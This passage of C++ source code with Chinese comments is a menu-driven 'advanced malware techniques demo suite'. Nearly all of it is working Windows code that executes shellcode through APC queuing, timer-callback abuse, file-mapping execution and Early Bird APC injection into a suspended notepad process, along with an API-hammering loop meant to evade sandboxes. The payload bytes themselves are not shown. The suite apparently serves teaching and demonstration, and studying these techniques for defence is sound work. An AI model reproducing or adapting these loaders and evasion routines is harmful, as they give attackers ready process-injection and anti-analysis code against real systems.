    LPVOID pMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMemory) {
        printf("  [!] 内存分配失败\n");
        return;
    }
    memcpy(pMemory, shellcode, sizeof(shellcode));
    printf("  [+] Shellcode 准备就绪: 0x%p\n", pMemory);

    // 创建一个处于可警告状态的线程
    HANDLE hThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD {
        printf("    [+] 牺牲线程已启动，进入可警告状态...\n");
        // 线程进入可警告的等待状态
        SleepEx(INFINITE, TRUE);
        return 0;
        }, NULL, 0, NULL);

    if (!hThread) {
        printf("  [!] 创建线程失败\n");
        return;
    }

    printf("  [+] 牺牲线程创建成功\n");

    // 将Shellcode作为APC排队到线程
    if (QueueUserAPC((PAPCFUNC)pMemory, hThread, NULL)) {
        printf("  [+] APC 已排队，Shellcode 即将执行...\n");
    }
    else {
        printf("  [!] APC 排队失败: %d\n", GetLastError());
    }

    Sleep(1000); // 给APC执行一些时间
    printf("  [#] 演示2结束，按回车继续...\n");
    getchar();
    CloseHandle(hThread);
}

// 演示3：回调函数滥用 (使用定时器回调)
void Demo3_CallbackAbuse() {
    printf("\n[演示3] 回调函数滥用 - 按回车键开始...\n");
    getchar();

    // 分配内存并复制Shellcode
    LPVOID pMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMemory) {
        printf("  [!] 内存分配失败\n");
        return;
    }
    memcpy(pMemory, shellcode, sizeof(shellcode));
    printf("  [+] Shellcode 准备就绪: 0x%p\n", pMemory);

    HANDLE hTimer;
    // 使用 CreateTimerQueueTimer，将 shellcode 地址作为回调函数传入
    if (CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)pMemory, NULL, 100, 0, WT_EXECUTEDEFAULT)) {
        printf("  [+] 定时器回调已注册，Shellcode 将在100ms后执行...\n");
        Sleep(1000); // 等待定时器触发
        DeleteTimerQueueTimer(NULL, hTimer, NULL);
    }
    else {
        printf("  [!] 创建定时器失败: %d\n", GetLastError());
    }

    printf("  [#] 演示3结束，按回车继续...\n");
    getchar();
}

// 演示4：映射注入 (避免使用 VirtualAlloc)
void Demo4_MapInjection() {
    printf("\n[演示4] 映射注入 - 按回车键开始...\n");
    getchar();

    // 使用 CreateFileMapping 创建文件映射对象（不在磁盘上实际创建文件）
    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);
    if (!hMapping) {
        printf("  [!] CreateFileMapping 失败: %d\n", GetLastError());
        return;
    }
    printf("  [+] 文件映射对象创建成功\n");

    // 将映射映射到当前进程的地址空间
    LPVOID pMemory = MapViewOfFile(hMapping, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, sizeof(shellcode));
    if (!pMemory) {
        printf("  [!] MapViewOfFile 失败: %d\n", GetLastError());
        CloseHandle(hMapping);
        return;
    }
    printf("  [+] 内存映射成功: 0x%p\n", pMemory);

    // 复制Shellcode到映射内存
    memcpy(pMemory, shellcode, sizeof(shellcode));
    printf("  [+] Shellcode 已写入映射内存\n");

    // 直接执行
    printf("  [+] 直接执行映射内存中的代码...\n");
    ((void(*)())pMemory)();

    // 清理
    UnmapViewOfFile(pMemory);
    CloseHandle(hMapping);

    printf("  [#] 演示4结束，按回车继续...\n");
    getchar();
}

// 演示5：API干扰 (沙箱规避)
void Demo5_ApiHammering() {
    printf("\n[演示5] API干扰 (沙箱规避) - 按回车键开始（这将持续约5秒）...\n");
    getchar();

    WCHAR szTempPath[MAX_PATH];
    WCHAR szTempFile[MAX_PATH];
    DWORD dwStartTime = GetTickCount64();

    GetTempPathW(MAX_PATH, szTempPath);
    PathCombineW(szTempFile, szTempPath, L"demo_temp.tmp");

    printf("  [+] 开始API干扰循环...\n");

    // 执行50次干扰循环
    for (int i = 0; i < 50; i++) {
        // 创建并写入文件
        HANDLE hFile = CreateFileW(szTempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            // 分配1MB缓冲区
            const SIZE_T bufferSize = 1024 * 1024;
            PBYTE pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, bufferSize);
            if (pBuffer) {
                // 用随机数据填充
                for (SIZE_T j = 0; j < bufferSize; j++) {
                    pBuffer[j] = (rand() % 256);
                }

                DWORD dwWritten;
                WriteFile(hFile, pBuffer, bufferSize, &dwWritten, NULL);
                HeapFree(GetProcessHeap(), 0, pBuffer);
            }
            CloseHandle(hFile);
        }

        // 重新打开并读取，然后删除
        hFile = CreateFileW(szTempFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            BYTE readBuffer[1024];
            DWORD dwRead;
            while (ReadFile(hFile, readBuffer, sizeof(readBuffer), &dwRead, NULL) && dwRead > 0) {
                // 模拟读取数据
            }
            CloseHandle(hFile); // 文件被删除
        }
    }

    DWORD dwEndTime = GetTickCount64();
    printf("  [+] API干扰完成，耗时: %lu 毫秒\n", dwEndTime - dwStartTime);
    printf("  [#] 演示5结束，按回车继续...\n");
    getchar();
}

// 演示6：早期鸟APC注入（创建挂起进程）
void Demo6_EarlyBirdAPC() {
    printf("\n[演示6] 早期鸟APC注入 - 按回车键开始...\n");
    printf("警告：这将创建一个挂起的notepad进程！\n");
    getchar();

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // 以挂起状态创建notepad进程
    if (CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, // 关键标志：创建即挂起
        NULL, NULL, &si, &pi))
    {
        printf("  [+] Notepad 进程已创建 (PID: %d)，处于挂起状态\n", pi.dwProcessId);

        // 在目标进程中分配内存
        LPVOID pRemoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (pRemoteMem) {
            printf("  [+] 在目标进程分配内存: 0x%p\n", pRemoteMem);

            // 写入Shellcode
            SIZE_T written;
            if (WriteProcessMemory(pi.hProcess, pRemoteMem, shellcode, sizeof(shellcode), &written)) {
                printf("  [+] Shellcode 写入远程进程\n");

                // 使用APC注入执行
                if (QueueUserAPC((PAPCFUNC)pRemoteMem, pi.hThread, NULL)) {
                    printf("  [+] APC 已排队到挂起线程\n");

                    // 恢复线程，触发APC执行
                    ResumeThread(pi.hThread);
                    printf("  [+] 线程已恢复，Shellcode 应执行 (notepad中将弹出计算器)\n");
                    Sleep(2000);
                }
            }

            // 清理
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    else {
        printf("  [!] 创建进程失败: %d\n", GetLastError());
    }

    printf("  [#] 演示6结束，按回车继续...\n");
    getchar();
}

int main() {
    printf("===============================================\n");
    printf("   恶意软件高级技术演示套件\n");
    printf("===============================================\n\n");

    int choice = 0;
    do {
        printf("\n请选择要运行的演示:\n");
        printf("1. 传统线程执行 (对比基线)\n");
        printf("2. APC注入执行\n");
        printf("3. 回调函数滥用\n");
        printf("4. 映射注入\n");
        printf("5. API干扰 (沙箱规避)\n");
        printf("6. 早期鸟APC注入\n");
        printf("0. 退出\n");
        printf("选择: ");

        std::cin >> choice;
        printf("\n");

        switch (choice) {
        case 1: Demo1_TraditionalThread(); break;
        case 2: Demo2_APCInjection(); break;
        case 3: Demo3_CallbackAbuse(); break;
        case 4: Demo4_MapInjection(); break;
        case 5: Demo5_ApiHammering(); break;
        case 6: Demo6_EarlyBirdAPC(); break;
        case 0: printf("再见!\n"); break;
        default: printf("无效选择!\n"); break;
        }

    } while (choice != 0);

    return 0;
}
```
